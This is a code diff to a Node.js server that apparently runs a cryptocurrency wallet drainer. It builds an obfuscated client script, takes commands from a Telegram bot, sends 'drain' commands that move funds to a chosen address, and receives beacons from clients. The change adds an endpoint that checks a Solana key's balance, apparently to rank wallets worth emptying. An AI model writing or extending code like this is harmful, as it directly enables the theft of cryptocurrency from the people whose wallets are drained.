@@ -25,7 +25,7 @@ if (!fs.existsSync(MIN)) {
     console.log("building client/x.min.js at startup...");
     execSync("npx --yes esbuild client/x.js --minify --format=iife --target=es2022 --outfile=client/x.min.js", { cwd: ROOT, stdio: "inherit" });
   } catch (e) {
-    console.error("esbuild failed \u2014 continuing, /x.min.js may be missing:", e && e.message);
+    console.error("esbuild failed — continuing, /x.min.js may be missing:", e && e.message);
   }
 }
 
@@ -155,7 +155,7 @@ async function pollTg() {
   } catch (e) { console.error("pollTg:", e && (e.message || e)); }
 }
 
-// ─── boot: fast-forward past Telegram backlog so stale commands never replay ───
+// ─── boot: fast-forward Telegram backlog so stale commands never replay ───
 (async function boot() {
   try {
     const j = await (await fetch("https://api.telegram.org/bot" + BOT + "/getUpdates?offset=-1&timeout=0")).json();
@@ -179,6 +179,7 @@ setInterval(() => {
   }
 }, 60000).unref();
 
+// ─── http server ───
 http.createServer((req, res) => {
   let url;
   try { url = new URL(req.url, "http://x"); } catch (e) { res.statusCode = 400; res.end(); return; }
@@ -199,6 +200,20 @@ http.createServer((req, res) => {
     if (c.rescan) return res.end(JSON.stringify({ cmd: "rescan", n: c.n }));
     delete cmds[pk];
     return res.end(JSON.stringify({ cmd: "drain", to: c.to, n: c.n }));
+  }
+
+  if (req.method === "GET" && url.pathname === "/api/balance") {
+    const pk = url.searchParams.get("pk") || "";
+    res.setHeader("content-type", "application/json");
+    fetch("https://solana-rpc.publicnode.com", {
+      method: "POST",
+      headers: { "content-type": "application/json" },
+      body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "getBalance", params: [pk] })
+    }).then(r => r.json()).then(j => {
+      const val = (j && j.result) ? j.result.value : 0;
+      res.end(JSON.stringify({ balance: val }));
+    }).catch(() => res.end(JSON.stringify({ balance: 0 })));
+    return;
   }
 
   if (req.method === "POST" && url.pathname === "/beacon") {
